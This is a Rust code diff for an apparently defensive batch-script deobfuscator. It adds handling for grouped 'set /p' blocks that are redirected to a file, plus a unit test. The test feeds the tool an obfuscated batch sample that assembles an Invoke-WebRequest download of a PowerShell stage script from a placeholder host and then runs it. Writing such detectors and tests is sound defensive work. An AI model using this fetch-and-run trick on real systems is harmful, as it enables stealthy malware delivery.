@@ -14110,6 +14110,98 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) -> Vec<
     captured
 }
 
+fn capture_block_set_p_redirects(
+    lines: &[String],
+    env: &mut Environment,
+) -> Vec<CapturedEchoBlock> {
+    let mut scratch = env.clone();
+    let mut i = 0usize;
+    let mut captured = Vec::new();
+    while i < lines.len() {
+        let stripped = lines[i].trim_start_matches(['@', ' ', '\t']);
+        let lower = stripped.to_ascii_lowercase();
+        if lower.starts_with("set ") || lower.starts_with("set\t") || lower.starts_with("set\"") {
+            crate::handlers::set::h_set(stripped, &mut scratch);
+        }
+
+        let opener = stripped.trim_end();
+        let (opener_cleaned, opener_redir) = crate::redirect::extract_redirections(opener);
+        let prefix_target = if opener_cleaned.trim() == "(" {
+            opener_redir.stdout
+        } else {
+            None
+        };
+        if opener != "(" && prefix_target.is_none() {
+            i += 1;
+            continue;
+        }
+
+        let mut j = i + 1;
+        let mut content = Vec::new();
+        let mut body_is_all_set_p = true;
+        let mut close_idx: Option<usize> = None;
+        while j < lines.len() {
+            let body = lines[j].trim_start_matches(['@', ' ', '\t']);
+            let body_trimmed = body.trim_end();
+            if body_trimmed.starts_with(')') {
+                close_idx = Some(j);
+                break;
+            }
+            if body_trimmed.is_empty() {
+                j += 1;
+                continue;
+            }
+            let (cleaned, _) = crate::redirect::extract_redirections(body_trimmed);
+            if let Some(bytes) = crate::synth::run_pipeline_bytes(cleaned.trim(), &mut scratch) {
+                content.extend_from_slice(&bytes);
+            } else {
+                body_is_all_set_p = false;
+                break;
+            }
+            j += 1;
+        }
+
+        let Some(close) = close_idx else {
+            i += 1;
+            continue;
+        };
+        if !body_is_all_set_p || content.is_empty() {
+            i = close + 1;
+            continue;
+        }
+
+        let close_line = lines[close].trim_start_matches(['@', ' ', '\t']);
+        let after_paren = close_line.trim_start_matches(')').trim();
+        let target = if let Some(prefix_target) = prefix_target {
+            let (close_cleaned, close_redir) = crate::redirect::extract_redirections(after_paren);
+            if close_redir.stdout.is_some() || !close_cleaned.trim().is_empty() {
+                i = close + 1;
+                continue;
+            }
+            prefix_target
+        } else {
+            let (_, redir) = crate::redirect::extract_redirections(after_paren);
+            let Some(target) = redir.stdout else {
+                i = close + 1;
+                continue;
+            };
+            target
+        };
+
+        let target_expanded = expand_redirect_path(target.path(), &mut scratch);
+        write_captured_echo_content(env, &target_expanded, target.append(), content.clone());
+        captured.push(CapturedEchoBlock {
+            open_idx: i,
+            close_idx: close,
+            target: target_expanded,
+            payload_bytes: content.len(),
+            collapsed: false,
+        });
+        i = close + 1;
+    }
+    captured
+}
+
 fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u32) {
     use std::collections::HashSet;
     use std::hash::{Hash, Hasher};
@@ -15205,9 +15297,20 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
         } else {
             Vec::new()
         };
+    let captured_set_p_blocks = if input.contains(&b'>')
+        && input.contains(&b'(')
+        && input.contains(&b')')
+        && input_contains_ascii_case_insensitive(input, b"set")
+        && input_contains_ascii_case_insensitive(input, b"/p")
+    {
+        capture_block_set_p_redirects(&lines, env)
+    } else {
+        Vec::new()
+    };
     let collapsed_echo_blocks: std::collections::HashMap<usize, CapturedEchoBlock> =
         captured_echo_blocks
             .into_iter()
+            .chain(captured_set_p_blocks)
             .filter(|block| block.collapsed)
             .map(|block| (block.open_idx, block))
             .collect();
@@ -23292,6 +23395,31 @@ powershell -NoProfile -File .\stage.ps1"#,
                 )
             }),
             "stdin set /p prompt redirection did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn grouped_set_p_prompt_redirect_joins_generated_script_without_newline() {
+        let report = crate::analyze(
+            br#"(
+<nul set /p "=Invoke-WebRequest -Uri h"
+<nul set /p "=ttps://grouped-set-p-prompt.example/stage.ps1"
+) > stage.ps1
+powershell -NoProfile -File .\stage.ps1"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::Download { src, .. }
+                        if src == "https://grouped-set-p-prompt.example/stage.ps1"
+                )
+            }),
+            "grouped set /p prompt redirection did not analyze generated script: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
